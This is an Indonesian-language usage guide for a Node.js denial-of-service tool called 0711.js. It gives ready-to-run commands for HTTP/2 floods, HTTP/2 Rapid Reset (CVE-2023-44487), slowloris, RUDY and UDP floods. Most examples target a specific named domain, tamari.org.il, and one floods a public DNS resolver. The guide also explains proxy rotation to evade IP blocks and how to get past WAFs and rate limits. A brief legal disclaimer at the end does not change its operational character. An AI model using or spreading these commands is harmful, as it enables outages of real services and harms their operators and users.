🚀 0711.js – Panduan Penggunaan Lengkap

---

📦 1. PERSYARATAN SISTEM

Komponen Minimal
Node.js v16.0.0 atau lebih baru
RAM 512 MB (minimum)
CPU 2 core (untuk 50+ worker)
OS Linux, macOS, Windows (Termux/Android)

---

⚙️ 2. INSTALASI

```bash
# 1. Pastikan Node.js terinstal
node -v
# Output: v16.x.x atau lebih tinggi

# 2. Download / clone script
curl -o 0711.js https://raw.githubusercontent.com/your-repo/0711/main/0711.js

# 3. (Opsional) Install dependencies untuk dashboard
npm install express cors

# 4. Jalankan
node 0711.js --target example.com --duration 30
```

---

🎯 3. PARAMETER LENGKAP

Parameter Wajib

Parameter Deskripsi Contoh
--target Target domain/IP (tanpa http://) --target tamari.org.il
--targets File daftar target (satu per baris) --targets targets.txt

Parameter Serangan

Parameter Deskripsi Default Contoh
--ports Port yang diserang (pisah koma) 443,80 --ports 443,8080
--workers Worker per port per target 50 --workers 100
--duration Durasi (detik), 0 = unlimited 120 --duration 60
--attack Protokol: http, https, udp https --attack http
--mode Mode serangan (lihat detail di bawah) normal --mode rapid_reset
--method HTTP method GET --method POST
--payloads File daftar path payload – --payloads payloads.txt

Parameter Proxy

Parameter Deskripsi Default Contoh
--proxy-auto Unduh proxy dari internet false --proxy-auto
--proxy-file File proxy manual (ip:port per baris) – --proxy-file proxies.txt
--no-proxy Nonaktifkan proxy false --no-proxy

Parameter Lainnya

Parameter Deskripsi Default Contoh
--verbose / -v Log detail false -v
--config File konfigurasi JSON – --config config.json
--dashboard Aktifkan dashboard real‑time false --dashboard
--dashboard-port Port dashboard 8080 --dashboard-port 9000
--output Direktori laporan ./reports --output ./hasil
--log File log 0711.log --log attack.log
--example-config Cetak contoh config – --example-config

---

🔥 4. MODE SERANGAN

Mode Deskripsi Cocok Untuk
normal HTTP/2 flood standar dengan header acak Uji ketahanan umum
rapid_reset HTTP/2 Rapid Reset (CVE‑2023‑44487) – kirim RST_STREAM segera Bypass rate‑limit, CPU exhaustion
slowloris Tahan koneksi dengan header tidak selesai Server dengan koneksi terbatas
rudy Slow POST dengan payload besar (1‑3 MB) dikirim perlahan Server dengan buffer terbatas
mixed Kombinasi acak dari semua mode (belum diimplementasikan sepenuhnya) Serangan adaptif

---

📝 5. CONTOH PENGGUNAAN LENGKAP

A. Serangan Dasar (Normal)

```bash
node 0711.js --target tamari.org.il --duration 30 --workers 5
```

B. HTTP/2 Rapid Reset

```bash
node 0711.js --target tamari.org.il --mode rapid_reset --workers 10 --duration 30
```

C. Slowloris (tahan koneksi)

```bash
node 0711.js --target tamari.org.il --mode slowloris --workers 3 --duration 20
```

D. RUDY (slow POST)

```bash
node 0711.js --target tamari.org.il --mode rudy --method POST --workers 2 --duration 20
```

E. Dengan Proxy Otomatis

```bash
node 0711.js --target tamari.org.il --proxy-auto --workers 20 --duration 60
```

F. Dengan File Proxy Manual

```bash
# Buat proxies.txt
echo "192.168.1.100:8080" > proxies.txt
echo "10.0.0.50:3128" >> proxies.txt

node 0711.js --target tamari.org.il --proxy-file proxies.txt --workers 15 --duration 30
```

G. Multi‑Target (Dari File)

```bash
# Buat targets.txt
echo "tamari.org.il" > targets.txt
echo "example.com" >> targets.txt

node 0711.js --targets targets.txt --ports 443,80 --workers 5 --duration 30
```

H. UDP Flood (Port DNS)

```bash
node 0711.js --target 8.8.8.8 --port 53 --attack udp --workers 10 --duration 10
```

I. Dengan Dashboard Real‑time

```bash
node 0711.js --target tamari.org.il --dashboard --dashboard-port 9000 --workers 20 --duration 60
```

Lalu buka di browser: http://localhost:9000/stats

J. Menggunakan File Config JSON

```bash
node 0711.js --config config.json
```

Contoh config.json:

```json
{
    "target": "tamari.org.il",
    "ports": [443, 80],
    "workersPerPort": 10,
    "duration": 60,
    "attackType": "https",
    "attackMode": "rapid_reset",
    "method": "GET",
    "proxyAuto": true,
    "outputDir": "./reports",
    "verbose": true
}
```

K. Serangan Panjang (1 Jam)

```bash
node 0711.js --target tamari.org.il --workers 5 --duration 3600 --proxy-auto
```

L. Cetak Contoh Config

```bash
node 0711.js --example-config > config.json
```

---

📊 6. MEMBACA STATISTIK & LAPORAN

Live Stats (Setiap 1 Detik)

```
[STATS] Total: 11584874 | Success: 9084669 | Failed: 2500205 | ServerErr: 0 | Active: 1 | Rate: 372451.0 req/s | SuccessRate: 78.4% | Elapsed: 30.0s
```

Kolom Deskripsi
Total Total percobaan request
Success Response 2xx/3xx (berhasil)
Failed Gagal (timeout, koneksi ditolak)
ServerErr Response 4xx/5xx
Active Koneksi aktif saat ini
Rate Request per detik
SuccessRate Persentase sukses

Laporan Akhir (JSON)

Setelah serangan berhenti, laporan tersimpan di ./reports/report_<timestamp>.json:

```json
{
  "timestamp": "2026-08-03T15:49:08.810Z",
  "targets": ["tamari.org.il"],
  "ports": [443, 80],
  "workers": 10,
  "attackMode": "rapid_reset",
  "duration": 30.59,
  "totalRequests": 11584874,
  "success": 9084669,
  "errors": 2500205,
  "serverErrors": 0,
  "successRate": "78.42%",
  "proxyUsed": 0,
  "attackType": "https",
  "method": "GET"
}
```

---

⏱️ 7. KAPAN SERANGAN BERHENTI?

Kondisi Kapan Berhenti
--duration 60 Setelah 60 detik
--duration 0 Tidak pernah – harus Ctrl+C
Tanpa --duration Setelah 120 detik (default)
Tekan Ctrl+C Segera (kapan saja)
Worker error > maxErrorsPerWorker Otomatis berhenti (default 1000 error)

---

🛑 8. MENGHENTIKAN SERANGAN

· Otomatis setelah --duration habis.
· Manual dengan menekan Ctrl+C – semua worker di‑stop, laporan dibuat.
· Jika serangan tidak berhenti, pastikan --duration tidak 0.

---

🧠 9. TIPS & TRIK

Situasi Solusi
Target tidak merespon Gunakan --attack http --port 80
IP diblokir Gunakan --proxy-auto atau --proxy-file
WAF memblokir Gunakan --mode slowloris atau --mode rudy
Rate‑limit Kurangi --workers, tambah --proxy-auto
Error tinggi Periksa --verbose untuk detail error
Ingin serangan cepat Gunakan --mode rapid_reset
Ingin serangan lambat Gunakan --mode slowloris

---

⚠️ 10. PERINGATAN

· Hanya untuk pengujian pada sistem sendiri atau dengan izin tertulis.
· Penggunaan tanpa izin adalah ILEGAL – dapat dikenai sanksi pidana.
· Penulis tidak bertanggung jawab atas penyalahgunaan.

---

📄 11. LISENSI

MIT License – gunakan dengan bijak.

---

🔥 0711 siap digunakan – pilih parameter sesuai kebutuhan 
